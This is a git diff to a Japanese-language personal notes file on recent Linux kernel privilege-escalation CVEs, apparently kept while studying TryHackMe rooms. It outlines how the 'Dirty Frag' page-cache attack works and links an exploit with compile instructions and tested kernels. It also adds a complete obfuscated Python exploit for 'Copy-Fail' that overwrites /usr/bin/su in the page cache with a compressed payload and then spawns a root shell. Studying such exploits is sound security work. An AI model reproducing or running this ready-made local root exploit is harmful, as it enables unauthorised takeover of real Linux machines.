@@ -1,5 +1,32 @@
 # CVE
 
+## CVE-2026-43284 (Dirty Frag)
+
+https://tryhackme.com/room/cve202643284
+
+1. 攻撃者はターゲットファイル（例：/usr/bin/su）をページキャッシュに読み込む。
+2. 攻撃者はsplice()関数を用いてパケットを構築し、ファイルのページがfrag[0]に格納されるようにする。
+3. カーネルのネットワークスタックはパケットを検証または復号パスに配信する。
+4. そのパスはsrc=dst（両方ともページを指す）に対してインプレース暗号化を実行する。
+5. 暗号化操作の副作用としてページキャッシュが変更される。
+6. ファイルのその後の読み取りでは、変更されたバイト列が返される。
+
+内部的に総当たり攻撃が必要なため、Copy-Failと違ってあまり長いデータを書き込むことは不可能であり、/etc/passwd の root ユーザーのパスワードフィールドをブランクにする方法を採用している。
+
+### エクスプロイト
+
+https://github.com/V4bel/dirtyfrag
+
+`gcc -o exploit exploit.c` でコンパイルするだけで使用可能。  
+ディストリビューション依存の部分があるが、次の環境でテストされている。
+
+- Ubuntu 24.04.4: 6.17.0-23-generic
+- RHEL 10.1: 6.12.0-124.49.1.el10_1.x86_64
+- openSUSE Tumbleweed: 7.0.2-1-default
+- CentOS Stream 10: 6.12.0-224.el10.x86_64
+- AlmaLinux 10: 6.12.0-124.52.3.el10_1.x86_64
+- Fedora 44: 6.19.14-300.fc44.x86_64
+
 ## CVE-2026-31431 (Copy-Fail)
 
 https://tryhackme.com/room/cve202631341
@@ -12,8 +39,22 @@ DirtyPipe（CVE-2022-0847）と異なり、競合の必要が無いのでカー�
 
 https://github.com/painoob/Copy-Fail-Exploit-CVE-2026-31431
 
+```python
+#!/usr/bin/env python3
+import os as g,zlib,socket as s
+def d(x):return bytes.fromhex(x)
+def c(f,t,c):
+ a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
+ try:u.recv(8+t)
+ except:0
+f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
+while i<len(e):c(f,i,e[i:i+4]);i+=4
+g.system("su")
+```
+
 - SUID バイナリファイルの先頭から任意のバイトコードに書き換えている。SUIDファイルなら何でも動作するが、suが最も目立ちにくいため選ばれていると思われる。
 - ページキャッシュ上のバイトを4バイトずつ書き換えることを繰り返している。
+- C言語のコードもある。
 
 ## CVE-2026-22738 (Spring AI)
 
